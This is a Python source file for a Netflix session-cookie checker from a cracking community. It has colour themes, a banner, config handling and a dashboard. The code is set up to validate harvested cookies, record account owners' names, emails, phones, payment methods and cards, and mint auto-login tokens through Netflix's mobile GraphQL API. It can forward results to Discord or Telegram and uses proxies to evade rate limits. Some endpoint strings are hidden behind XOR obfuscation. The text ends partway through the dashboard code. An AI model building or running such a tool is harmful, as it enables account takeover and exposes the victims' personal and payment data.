import copy
import html
import json
import os
import random
import re
import shutil
import string
import sys
import threading
import time
import unicodedata
from datetime import datetime, timedelta, timezone
from urllib.parse import quote

import requests

try:
    import yaml
except ImportError:
    yaml = None

# ╔══════════════════════════════════════════════════════════════╗
# ║                    THEME ENGINE v3.0                         ║
# ║              20+ Themes with Glow Effects                    ║
# ╚══════════════════════════════════════════════════════════════╝

THEMES = {
    # ── Default: Netflix Red & Black ──
    "netflix": {
        "name": "🎬 Netflix Classic",
        "primary": "\033[91m",       # bright red
        "secondary": "\033[97m",     # white
        "accent": "\033[93m",        # gold
        "success": "\033[92m",       # green
        "warning": "\033[93m",       # yellow
        "error": "\033[91m",         # red
        "info": "\033[96m",          # cyan
        "dim": "\033[90m",           # dark gray
        "glow1": "\033[91m\033[1m",  # bold red
        "glow2": "\033[93m\033[1m",  # bold gold
        "box": "\033[91m",
        "banner_color": "\033[91m",
    },
    # ── Cyberpunk Neon ──
    "cyberpunk": {
        "name": "⚡ Cyberpunk Neon",
        "primary": "\033[95m",
        "secondary": "\033[97m",
        "accent": "\033[93m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[96m",
        "dim": "\033[90m",
        "glow1": "\033[95m\033[1m",
        "glow2": "\033[96m\033[1m",
        "box": "\033[95m",
        "banner_color": "\033[95m",
    },
    # ── Matrix Green ──
    "matrix": {
        "name": "💻 Matrix Green",
        "primary": "\033[92m",
        "secondary": "\033[97m",
        "accent": "\033[32m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[92m",
        "dim": "\033[90m",
        "glow1": "\033[92m\033[1m",
        "glow2": "\033[32m\033[1m",
        "box": "\033[92m",
        "banner_color": "\033[92m",
    },
    # ── Ocean Blue ──
    "ocean": {
        "name": "🌊 Ocean Blue",
        "primary": "\033[94m",
        "secondary": "\033[97m",
        "accent": "\033[96m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[96m",
        "dim": "\033[90m",
        "glow1": "\033[94m\033[1m",
        "glow2": "\033[96m\033[1m",
        "box": "\033[94m",
        "banner_color": "\033[94m",
    },
    # ── Gold Luxury ──
    "gold": {
        "name": "👑 Gold Luxury",
        "primary": "\033[93m",
        "secondary": "\033[97m",
        "accent": "\033[33m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[93m",
        "dim": "\033[90m",
        "glow1": "\033[93m\033[1m",
        "glow2": "\033[33m\033[1m",
        "box": "\033[93m",
        "banner_color": "\033[93m",
    },
    # ── Purple Haze ──
    "purple": {
        "name": "🔮 Purple Haze",
        "primary": "\033[35m",
        "secondary": "\033[97m",
        "accent": "\033[95m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[96m",
        "dim": "\033[90m",
        "glow1": "\033[95m\033[1m",
        "glow2": "\033[35m\033[1m",
        "box": "\033[35m",
        "banner_color": "\033[95m",
    },
    # ── Blood Moon ──
    "blood": {
        "name": "🩸 Blood Moon",
        "primary": "\033[31m",
        "secondary": "\033[97m",
        "accent": "\033[91m",
        "success": "\033[32m",
        "warning": "\033[33m",
        "error": "\033[31m",
        "info": "\033[91m",
        "dim": "\033[90m",
        "glow1": "\033[91m\033[1m",
        "glow2": "\033[31m\033[1m",
        "box": "\033[31m",
        "banner_color": "\033[31m",
    },
    # ── Ice White ──
    "ice": {
        "name": "❄️  Ice White",
        "primary": "\033[97m",
        "secondary": "\033[96m",
        "accent": "\033[94m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[96m",
        "dim": "\033[90m",
        "glow1": "\033[97m\033[1m",
        "glow2": "\033[96m\033[1m",
        "box": "\033[97m",
        "banner_color": "\033[97m",
    },
    # ── Sunset Orange ──
    "sunset": {
        "name": "🌅 Sunset Orange",
        "primary": "\033[33m",
        "secondary": "\033[97m",
        "accent": "\033[91m",
        "success": "\033[92m",
        "warning": "\033[33m",
        "error": "\033[91m",
        "info": "\033[93m",
        "dim": "\033[90m",
        "glow1": "\033[33m\033[1m",
        "glow2": "\033[91m\033[1m",
        "box": "\033[33m",
        "banner_color": "\033[33m",
    },
    # ── Deep Space ──
    "deepspace": {
        "name": "🚀 Deep Space",
        "primary": "\033[34m",
        "secondary": "\033[97m",
        "accent": "\033[35m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[94m",
        "dim": "\033[90m",
        "glow1": "\033[94m\033[1m",
        "glow2": "\033[35m\033[1m",
        "box": "\033[34m",
        "banner_color": "\033[34m",
    },
    # ── Toxic Green ──
    "toxic": {
        "name": "☢️  Toxic Green",
        "primary": "\033[32m",
        "secondary": "\033[92m",
        "accent": "\033[93m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[32m",
        "dim": "\033[90m",
        "glow1": "\033[92m\033[1m",
        "glow2": "\033[32m\033[1m",
        "box": "\033[32m",
        "banner_color": "\033[32m",
    },
    # ── Cherry Blossom ──
    "cherry": {
        "name": "🌸 Cherry Blossom",
        "primary": "\033[95m",
        "secondary": "\033[97m",
        "accent": "\033[35m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[95m",
        "dim": "\033[90m",
        "glow1": "\033[95m\033[1m",
        "glow2": "\033[35m\033[1m",
        "box": "\033[95m",
        "banner_color": "\033[95m",
    },
    # ── Lava Flow ──
    "lava": {
        "name": "🌋 Lava Flow",
        "primary": "\033[91m",
        "secondary": "\033[33m",
        "accent": "\033[93m",
        "success": "\033[92m",
        "warning": "\033[33m",
        "error": "\033[91m",
        "info": "\033[33m",
        "dim": "\033[90m",
        "glow1": "\033[91m\033[1m",
        "glow2": "\033[33m\033[1m",
        "box": "\033[91m",
        "banner_color": "\033[91m",
    },
    # ── Arctic ──
    "arctic": {
        "name": "🧊 Arctic Frost",
        "primary": "\033[96m",
        "secondary": "\033[97m",
        "accent": "\033[94m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[96m",
        "dim": "\033[90m",
        "glow1": "\033[96m\033[1m",
        "glow2": "\033[94m\033[1m",
        "box": "\033[96m",
        "banner_color": "\033[96m",
    },
    # ── Midnight ──
    "midnight": {
        "name": "🌙 Midnight Dark",
        "primary": "\033[90m",
        "secondary": "\033[97m",
        "accent": "\033[94m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[94m",
        "dim": "\033[90m",
        "glow1": "\033[97m\033[1m",
        "glow2": "\033[94m\033[1m",
        "box": "\033[90m",
        "banner_color": "\033[90m",
    },
    # ── Rainbow Shift ──
    "rainbow": {
        "name": "🌈 Rainbow Shift",
        "primary": "\033[95m",
        "secondary": "\033[97m",
        "accent": "\033[93m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[96m",
        "dim": "\033[90m",
        "glow1": "\033[95m\033[1m",
        "glow2": "\033[96m\033[1m",
        "box": "\033[95m",
        "banner_color": "\033[95m",
    },
    # ── Hacker ──
    "hacker": {
        "name": "💀 Hacker Mode",
        "primary": "\033[32m",
        "secondary": "\033[90m",
        "accent": "\033[92m",
        "success": "\033[92m",
        "warning": "\033[33m",
        "error": "\033[91m",
        "info": "\033[32m",
        "dim": "\033[90m",
        "glow1": "\033[92m\033[1m",
        "glow2": "\033[32m\033[1m",
        "box": "\033[32m",
        "banner_color": "\033[32m",
    },
    # ── Galaxy ──
    "galaxy": {
        "name": "🌌 Galaxy",
        "primary": "\033[35m",
        "secondary": "\033[97m",
        "accent": "\033[96m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[94m",
        "dim": "\033[90m",
        "glow1": "\033[35m\033[1m",
        "glow2": "\033[94m\033[1m",
        "box": "\033[35m",
        "banner_color": "\033[35m",
    },
    # ── Fire ──
    "fire": {
        "name": "🔥 Fire Storm",
        "primary": "\033[91m",
        "secondary": "\033[93m",
        "accent": "\033[33m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[33m",
        "dim": "\033[90m",
        "glow1": "\033[91m\033[1m",
        "glow2": "\033[33m\033[1m",
        "box": "\033[91m",
        "banner_color": "\033[91m",
    },
    # ── Mint ──
    "mint": {
        "name": "🍃 Mint Fresh",
        "primary": "\033[32m",
        "secondary": "\033[97m",
        "accent": "\033[96m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[96m",
        "dim": "\033[90m",
        "glow1": "\033[92m\033[1m",
        "glow2": "\033[96m\033[1m",
        "box": "\033[32m",
        "banner_color": "\033[32m",
    },
    # ── Dracula ──
    "dracula": {
        "name": "🧛 Dracula",
        "primary": "\033[35m",
        "secondary": "\033[97m",
        "accent": "\033[91m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[95m",
        "dim": "\033[90m",
        "glow1": "\033[95m\033[1m",
        "glow2": "\033[91m\033[1m",
        "box": "\033[35m",
        "banner_color": "\033[35m",
    },
    # ── Neon Pink ──
    "neonpink": {
        "name": "💗 Neon Pink",
        "primary": "\033[95m",
        "secondary": "\033[97m",
        "accent": "\033[35m",
        "success": "\033[92m",
        "warning": "\033[93m",
        "error": "\033[91m",
        "info": "\033[95m",
        "dim": "\033[90m",
        "glow1": "\033[95m\033[1m",
        "glow2": "\033[35m\033[1m",
        "box": "\033[95m",
        "banner_color": "\033[95m",
    },
    # ── Retro ──
    "retro": {
        "name": "🕹️  Retro CRT",
        "primary": "\033[33m",
        "secondary": "\033[32m",
        "accent": "\033[93m",
        "success": "\033[32m",
        "warning": "\033[33m",
        "error": "\033[31m",
        "info": "\033[33m",
        "dim": "\033[90m",
        "glow1": "\033[93m\033[1m",
        "glow2": "\033[33m\033[1m",
        "box": "\033[33m",
        "banner_color": "\033[33m",
    },
}

THEME_KEYS = list(THEMES.keys())
RE = "\033[0m"
BOLD = "\033[1m"
BLINK = "\033[5m"
UNDERLINE = "\033[4m"
DIM_CODE = "\033[2m"

# Global current theme
_current_theme_key = "netflix"


def get_theme():
    return THEMES.get(_current_theme_key, THEMES["netflix"])


def set_theme(key):
    global _current_theme_key
    if key in THEMES:
        _current_theme_key = key


def T(color_key):
    """Shorthand to get a theme color code."""
    return get_theme().get(color_key, "")


# ── Glow Text Helpers ──────────────────────────────────────────

def glow(text, intensity=1):
    """Apply glow effect (bold + primary color cycling)."""
    t = get_theme()
    if intensity == 2:
        return f"{t['glow2']}{BOLD}{text}{RE}"
    return f"{t['glow1']}{BOLD}{text}{RE}"


def glowing_box_top(width=66):
    t = get_theme()
    return f"{t['box']}{BOLD}╔{'═' * width}╗{RE}"


def glowing_box_bottom(width=66):
    t = get_theme()
    return f"{t['box']}{BOLD}╚{'═' * width}╝{RE}"


def glowing_box_sep(width=66):
    t = get_theme()
    return f"{t['box']}{BOLD}╠{'═' * width}╣{RE}"


def glowing_box_row(content_plain, content_colored, width=66):
    t = get_theme()
    pad = width - len(content_plain)
    if pad < 0:
        pad = 0
    return f"{t['box']}{BOLD}║{RE}{content_colored}{' ' * pad}{t['box']}{BOLD}║{RE}"


def pulse_animation(text, color_key="primary", steps=3):
    """Print text with a brief pulse effect."""
    t = get_theme()
    for i in range(steps):
        if i % 2 == 0:
            sys.stdout.write(f"\r{t[color_key]}{BOLD}{text}{RE}")
        else:
            sys.stdout.write(f"\r{DIM_CODE}{text}{RE}")
        sys.stdout.flush()
        time.sleep(0.07)
    sys.stdout.write(f"\r{t[color_key]}{BOLD}{text}{RE}\n")
    sys.stdout.flush()


def animated_loading(message="Yükleniyor", steps=8):
    """Animated spinner."""
    spinners = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧"]
    t = get_theme()
    for i in range(steps):
        spinner = spinners[i % len(spinners)]
        sys.stdout.write(f"\r  {t['primary']}{BOLD}{spinner}{RE}  {t['secondary']}{message}...{RE}")
        sys.stdout.flush()
        time.sleep(0.08)
    sys.stdout.write(f"\r  {t['success']}{BOLD}✓{RE}  {t['secondary']}{message} tamam!{RE}      \n")
    sys.stdout.flush()


def gradient_bar(filled, total, width=40, char_fill="█", char_empty="░"):
    """Render a colorful gradient progress bar."""
    t = get_theme()
    if total == 0:
        pct = 0
    else:
        pct = filled / total
    n_fill = int(width * pct)
    n_empty = width - n_fill
    bar = f"{t['success']}{BOLD}{char_fill * n_fill}{RE}{t['dim']}{char_empty * n_empty}{RE}"
    return bar, int(pct * 100)


def print_glow_divider(char="═", width=68, color_key="primary"):
    t = get_theme()
    print(f"{t[color_key]}{BOLD}{char * width}{RE}")


def neon_label(text, color_key="accent"):
    t = get_theme()
    return f"{t[color_key]}{BOLD}[ {text} ]{RE}"


def social_links_bar():
    """Return the social links bar string."""
    t = get_theme()
    P = t["primary"]; A = t["accent"]; S = t["secondary"]; I = t["info"]
    return (
        f"  {P}{BOLD}║{RE}  "
        f"{A}💬 Discord:{RE} {I}{BOLD}discord.gg/y759R26VUG{RE}   "
        f"{A}📱 Telegram:{RE} {I}{BOLD}t.me/r2xzzs{RE}   "
        f"{A}🌐 Web:{RE} {I}{BOLD}crackturkey.xyz{RE}   "
        f"{P}{BOLD}║{RE}"
    )


def social_links_bar_plain():
    """Plain version for width calculation."""
    return "  ║  💬 Discord: discord.gg/y759R26VUG   📱 Telegram: t.me/r2xzzs   🌐 Web: crackturkey.xyz   ║"


# ── Dynamic Banner ─────────────────────────────────────────────

def print_banner():
    t = get_theme()
    P = t["primary"]; A = t["accent"]; S = t["secondary"]; B2 = t["box"]; I = t["info"]
    theme_name = THEMES.get(_current_theme_key, {}).get("name", "Netflix Classic")

    print(f"""
{P}{BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗{RE}
{P}{BOLD}║{RE}{S}  ███╗░░██╗███████╗████████╗███████╗██╗░░░░░██╗██╗░░██╗  ░█████╗░░█████╗░░█████╗░██╗░░██╗██╗███████╗  {P}{BOLD}║{RE}
{P}{BOLD}║{RE}{S}  ████╗░██║██╔════╝╚══██╔══╝██╔════╝██║░░░░░██║╚██╗██╔╝  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║██╔════╝  {P}{BOLD}║{RE}
{P}{BOLD}║{RE}{S}  ██╔██╗██║█████╗░░░░░██║░░░█████╗░░██║░░░░░██║░╚███╔╝░  ██║░░╚═╝██║░░██║██║░░██║█████═╝░██║█████╗░░  {P}{BOLD}║{RE}
{P}{BOLD}║{RE}{S}  ██║╚████║██╔══╝░░░░░██║░░░██╔══╝░░██║░░░░░██║░██╔██╗░  ██║░░██╗██║░░██║██║░░██║██╔═██╗░██║██╔══╝░░  {P}{BOLD}║{RE}
{P}{BOLD}║{RE}{S}  ██║░╚███║███████╗░░░██║░░░██║░░░░░███████╗██║██╔╝╚██╗  ╚█████╔╝╚█████╔╝╚█████╔╝██║░╚██╗██║███████╗  {P}{BOLD}║{RE}
{P}{BOLD}║{RE}{S}  ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝╚═╝░░╚═╝  ░╚════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚══════╝  {P}{BOLD}║{RE}
{P}{BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════════════════╣{RE}
{social_links_bar()}
{P}{BOLD}║{RE}  {A}🎨 Tema:{RE} {I}{BOLD}{theme_name:<30}{RE}  {A}🔑 By:{RE} {S}@r2xzzs{RE}  {A}v:{RE} {S}3.0.0{RE}                     {P}{BOLD}║{RE}
{P}{BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝{RE}""")


# ── Default Config & YAML ──────────────────────────────────────

DEFAULT_CONFIG = {
    "txt_fields": {
        "name": True, "email": True, "max_streams": True, "plan": True,
        "country": True, "member_since": True, "next_billing": True,
        "extra_members": True, "payment_method": True, "card": True,
        "phone": True, "quality": True, "hold_status": True,
        "email_verified": True, "membership_status": True, "profiles": True,
        "user_guid": True,
    },
    "nftoken": True,
    "notifications": {
        "webhook": {"enabled": False, "url": "", "mode": "full", "plans": "all"},
        "telegram": {"enabled": False, "bot_token": "", "chat_id": "", "mode": "full", "plans": "all"},
    },
    "display": {"mode": "simple"},
    "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
    "theme": "netflix",
}

DEFAULT_YAML_CONFIG = """# ╔══════════════════════════════════════════════════════╗
# ║         🎬 Netflix Cookie Checker Yapılandırması      ║
# ║                   Config By @r2xzzs                  ║
# ╚══════════════════════════════════════════════════════╝

txt_fields:
  name: true
  email: true
  plan: true
  country: true
  member_since: true
  quality: true
  max_streams: true
  next_billing: true
  payment_method: true
  card: true
  phone: true
  hold_status: true
  extra_members: true
  email_verified: true
  membership_status: true
  profiles: true
  user_guid: true

nftoken: true

notifications:
  webhook:
    enabled: false
    url: ""
    mode: "full"
    plans: "all"
  telegram:
    enabled: false
    bot_token: ""
    chat_id: ""
    mode: "full"
    plans: "all"

display:
  mode: "simple"

retries:
  error_proxy_attempts: 3
  nftoken_attempts: 1

theme: "netflix"
"""

APP_VERSION = "3.0.0"
cookies_folder = "cookies"
output_folder = "output"
failed_folder = "failed"
broken_folder = "broken"
proxy_file = "proxy.txt"
DISCORD_WEBHOOK_USERNAME = "Netflix Checker @r2xzzs"
DISCORD_WEBHOOK_AVATAR_URL = ""

lock = threading.Lock()
guid_lock = threading.Lock()
processed_emails = set()

NFTOKEN_API_URL = "https://android13.prod.ftl.netflix.com/graphql"
NFTOKEN_HEADERS = {
    "User-Agent": (
        "com.netflix.mediaclient/63884 "
        "(Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)"
    ),
    "Accept": "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
    "Content-Type": "application/json",
    "Origin": "https://www.netflix.com",
    "Referer": "https://www.netflix.com/",
}
NFTOKEN_PAYLOAD = {
    "operationName": "CreateAutoLoginToken",
    "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
    "extensions": {
        "persistedQuery": {
            "version": 102,
            "id": "76e97129-f4b5-41a0-a73c-12e674896849",
        }
    },
}


# ── Hidden Encoder ─────────────────────────────────────────────

def _decode_hidden_text(values):
    return "".join(chr(value ^ _pull_bias()) for value in values)


def _stitch_hidden(slot):
    merged = []
    for provider in (_noise_floor, _window_cache, _frame_index):
        for block in provider(slot):
            merged.extend(block)
    return _decode_hidden_text(merged)


def parse_version_parts(value):
    cleaned = str(value or "").strip().lower().lstrip("v")
    parts = []
    for part in cleaned.split("."):
        match = re.match(r"(\d+)", part)
        parts.append(int(match.group(1)) if match else 0)
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts)


def is_newer_version(current_version, latest_version):
    current_parts = parse_version_parts(current_version)
    latest_parts = parse_version_parts(latest_version)
    max_len = max(len(current_parts), len(latest_parts))
    current_parts += (0,) * (max_len - len(current_parts))
    latest_parts += (0,) * (max_len - len(latest_parts))
    return latest_parts > current_parts


def _resolve_update_endpoints():
    repo_url = _stitch_hidden(29)
    repo_root = _stitch_hidden(53)
    api_prefix = _stitch_hidden(59)
    api_suffix = _stitch_hidden(61)
    accept_value = _stitch_hidden(67)
    agent_prefix = _stitch_hidden(71)
    repo_path = repo_url.replace(repo_root, "", 1).strip("/")
    return {
        "repo_url": repo_url,
        "api_url": f"{api_prefix}{repo_path}{api_suffix}",
        "discord_url": _stitch_hidden(47),
        "accept_value": accept_value,
        "agent_value": f"{agent_prefix}{APP_VERSION}",
    }


def _render_update_notice(latest_version, github_url, discord_url):
    t = get_theme()
    P = t["primary"]; A = t["accent"]; S = t["secondary"]; I = t["info"]
    print()
    print_glow_divider("═", 68, "warning")
    print(f"  {A}{BOLD}🔔 GÜNCELLEME MEVCUT!{RE}  {S}Mevcut: {P}v{APP_VERSION}{RE}  →  {S}Yeni: {t['success']}{BOLD}v{latest_version}{RE}")
    print(f"  {I}📥 İndir: {UNDERLINE}{github_url}{RE}")
    print(f"  {I}💬 Discord: {UNDERLINE}{discord_url}{RE}")
    print_glow_divider("═", 68, "warning")
    print()


def check_for_updates():
    update_meta = _resolve_update_endpoints()
    try:
        response = requests.get(
            update_meta["api_url"],
            headers={"Accept": update_meta["accept_value"], "User-Agent": update_meta["agent_value"]},
            timeout=5,
        )
        if response.status_code != 200:
            return
        payload = response.json()
        if not isinstance(payload, dict):
            return
        latest_version = str(payload.get("tag_name") or payload.get("name") or "").strip()
        if not latest_version or not is_newer_version(APP_VERSION, latest_version):
            return
        github_url = payload.get(_stitch_hidden(73)) or update_meta["repo_url"]
        _render_update_notice(latest_version, github_url, update_meta["discord_url"])
    except Exception:
        return


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def set_console_title(title):
    if os.name == "nt":
        os.system(f"title NetflixChecker - {title}")
    else:
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()


def color_text(text, code, enabled=True):
    if not enabled:
        return text
    return f"{code}{text}{RE}"


def create_base_folders():
    for folder in [cookies_folder, output_folder, failed_folder, broken_folder]:
        os.makedirs(folder, exist_ok=True)
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# Add your proxies here\n")
            f.write("# One proxy per line\n")
            f.write("# Supported: ip:port | user:pass@ip:port | socks5://...\n")


def get_run_folder():
    now = datetime.now()
    return f"run_{now.strftime('%Y-%m-%d_%H-%M-%S')}"


def cleanup_stale_temp_files():
    managed_roots = [output_folder, failed_folder, broken_folder]
    for root in managed_roots:
        if not os.path.exists(root):
            continue
        for current_root, _, files in os.walk(root):
            for filename in files:
                if filename.lower().endswith(".tmp"):
                    try:
                        os.remove(os.path.join(current_root, filename))
                    except Exception:
                        pass


def sanitize_reason_for_filename(reason):
    cleaned = decode_netflix_value(reason) or "unknown_reason"
    cleaned = cleaned.strip().lower()
    replacements = {
        "http 403 forbidden": "http_403_forbidden",
        "http 429 rate limited": "http_429_rate_limited",
        "http 500 server error": "http_500_server_error",
        "http 502 bad gateway": "http_502_bad_gateway",
        "http 503 service unavailable": "http_503_service_unavailable",
        "http 504 gateway timeout": "http_504_gateway_timeout",
        "request timeout": "timeout", "timeout": "timeout",
        "proxy error": "proxy_error",
        "zorunlu cookie eksik": "zorunlu_cookie_eksik",
        "hesap sayfası eksik": "hesap_sayfasi_eksik",
        "nftoken_api_hatasi": "nftoken_api_error",
    }
    for source, target in replacements.items():
        if cleaned == source:
            cleaned = target
            break
    cleaned = re.sub(r"[^a-z0-9]+", "_", cleaned).strip("_")
    return cleaned or "unknown_reason"


def build_reason_filename(original_name, reason):
    base_name, extension = os.path.splitext(original_name)
    safe_reason = sanitize_reason_for_filename(reason)
    trimmed_base = re.sub(r'[<>:"/\\|?*]+', "_", base_name).strip(" .") or "cookie"
    candidate = f"{safe_reason}_{trimmed_base}{extension or '.txt'}"
    return candidate


def move_cookie_with_reason(cookie_path, target_folder, cookie_file, reason):
    if not os.path.exists(cookie_path):
        return
    os.makedirs(target_folder, exist_ok=True)
    target_name = build_reason_filename(cookie_file, reason)
    target_path = os.path.join(target_folder, target_name)
    if os.path.exists(target_path):
        suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
        base_name, extension = os.path.splitext(target_name)
        target_path = os.path.join(target_folder, f"{base_name}_{suffix}{extension}")
    shutil.move(cookie_path, target_path)


def is_plan_allowed_for_notifications(channel_cfg, plan_key):
    plans_value = (channel_cfg or {}).get("plans", "all")
    if plans_value is None:
        return True
    if isinstance(plans_value, str):
        normalized = plans_value.strip().lower()
        if normalized in {"", "all", "*"}:
            return True
        allowed = {item.strip().lower() for item in normalized.split(",") if item.strip()}
        return (plan_key or "").lower() in allowed
    if isinstance(plans_value, (list, tuple, set)):
        allowed = {str(item).strip().lower() for item in plans_value if str(item).strip()}
        if not allowed:
            return True
        return (plan_key or "").lower() in allowed
    return True


def get_canonical_output_label(plan_key):
    canonical_labels = {
        "premium": "Premium", "standard_with_ads": "Standard With Ads",
        "standard": "Standard", "basic": "Basic", "mobile": "Mobile",
        "free": "Free", "duplicate": "Duplicate", "unknown": "Unknown",
    }
    return canonical_labels.get(plan_key, "Unknown")


def create_output_folder_when_needed(base_folder, plan_label, run_folder):
    safe_plan = decode_netflix_value(plan_label) or "Unknown"
    safe_plan = re.sub(r'[<>:"/\\|?*]+', "_", safe_plan).strip(" .") or "Unknown"
    output_path = os.path.join(base_folder, run_folder, safe_plan)
    os.makedirs(output_path, exist_ok=True)
    return output_path


def write_text_file_safely(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    text_content = content if isinstance(content, str) else str(content or "")
    data = text_content.encode("utf-8", errors="replace")
    last_error = None
    for _ in range(2):
        try:
            with open(path, "wb") as out_f:
                out_f.write(data)
                out_f.flush()
                try:
                    os.fsync(out_f.fileno())
                except OSError:
                    pass
            if data and os.path.getsize(path) == 0:
                raise IOError("File write produced a zero-byte output")
            return
        except Exception as exc:
            last_error = exc
            try:
                if os.path.exists(path) and os.path.getsize(path) == 0:
                    os.remove(path)
            except Exception:
                pass
    if last_error is not None:
        raise last_error


def _pull_bias():
    anchor = (11, 7, 5)
    return sum(anchor)


_NOISE_FLOOR_MAP = {
    53: ((127, 99, 99, 103, 100, 45, 56, 56, 112, 126),),
    73: ((127, 99, 122),),
    29: (
        (127, 99, 99, 103, 100, 45, 56, 56, 112, 126, 99, 127, 98, 117, 57, 116, 120, 122),
        (56, 127, 118, 101, 100, 127, 126, 99, 124, 118, 122, 117, 120, 125),
    ),
    59: ((127, 99, 99, 103, 100, 45, 56, 56, 118, 103, 126, 57),),
    79: ((66, 103, 115, 118, 99, 114),),
    89: ((83, 120, 96, 121, 123, 120, 118, 115),),
    47: ((127, 99, 99, 103, 100, 45, 56, 56, 115, 126),),
    97: ((83, 120, 96, 121, 123, 120, 118, 115),),
}


def _noise_floor(slot):
    return _NOISE_FLOOR_MAP.get(slot, ())


def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged


def load_config():
    config_yaml_path = "config.yml"
    if os.path.exists(config_yaml_path):
        if yaml is None:
            return copy.deepcopy(DEFAULT_CONFIG), "default"
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config), config_yaml_path
        except Exception:
            with open(config_yaml_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_YAML_CONFIG)
            return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path
    with open(config_yaml_path, "w", encoding="utf-8") as f:
        f.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path


def describe_http_error(status_code):
    descriptions = {
        403: "HTTP 403 Forbidden", 429: "HTTP 429 Rate Limited",
        500: "HTTP 500 Server Error", 502: "HTTP 502 Bad Gateway",
        503: "HTTP 503 Service Unavailable", 504: "HTTP 504 Gateway Timeout",
    }
    return descriptions.get(status_code, f"HTTP {status_code}")


# ── Dashboard ──────────────────────────────────────────────────

def render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left, cookies_total, colored=True):
    t = get_theme()
    P = t["primary"]; S = t["secondary"]; A = t["accent"]
    G = t["success"]; W = t["warning"]; E = t["error"]
    I = t["info"]; D = t["dim"]; B2 = t["box"]
    M = t.get("glow1", P)
    BLUE = "\033[94m"
    BOX_W = 64

    def c(text, code):
        return f"{code}{BOLD}{text}{RE}" if colored else text

    def box_row(plain, col=None):
        if col is None:
            col = plain
        pad = BOX_W - len(plain)
        if pad < 0:
            pad = 0
        if colored:
            print(f"{B2}{BOLD}║{RE}{col}{' ' * pad}{B2}{BOLD}║{RE}")
        else:
            print(f"║{plain}{' ' * pad}║")

    def box_header(title_plain, title_col=None):
        if title_col is None:
            title_col = title_plain
        pad_total = BOX_W - len(title_plain)
        pl = pad_total // 2
        pr = pad_total - pl
        if colored:
            print(f"{B2}{BOLD}║{RE}{' ' * pl}{title_col}{' ' * pr}{B2}{BOLD}║{RE}")
        else:
            print(f"║{' ' * pl}{title_plain}{' ' * pr}║")

    def sep():
        if colored:
            print(f"{B2}{BOLD}╠{'═' * BOX_W}╣{RE}")
        else:
            print(f"╠{'═' * BOX_W}╣")

    def top():
        if colored:
            print(f"{B2}{BOLD}╔{'═' * BOX_W}╗{RE}")
        else:
            print(f"╔{'═' * BOX_W}╗")

    def bot():
        if colored:
            print(f"{B2}{BOLD}╚{'═' * BOX_W}╝{RE}")
        else:
            print(f"╚{'═' * BOX_W}╝")

    clear_screen()
    processed = cookies_total - cookies_left
    valid = counts["hits"] + counts["free"]
    bar_fill = 38
    bar, pct = gradient_bar(processed, cookies_total, bar_fill)
    pct_str = f" {pct}%"

    print_banner()

    top()
    box_header("  📊  KONTROL İLERLEMESİ", f"  {c('📊  KONTROL İLERLEMESİ', A)}")
    sep()
    bar_row_plain = f"  {'█' * int(bar_fill * processed / cookies_total) if cookies_total else ''}{'░' * (bar_fill - int(bar_fill * processed / cookies_total) if cookies_total else bar_fill)}{pct_str}"
    box_row(bar_row_plain, f"  {bar}{c(pct_str, S)}")
    stats_p = f"  🍪 Toplam: {cookies_total}   ✅ İşlenen: {processed}   ⏳ Kalan: {cookies_left}"
    stats_c = f"  {c('🍪', I)} {c(str(cookies_total), S)}   {c('✅', G)} {c(str(processed), S)}   {c('⏳', W)} {c(str(cookies_left), A)}"
    box_row(stats_p, stats_c)
    sep()

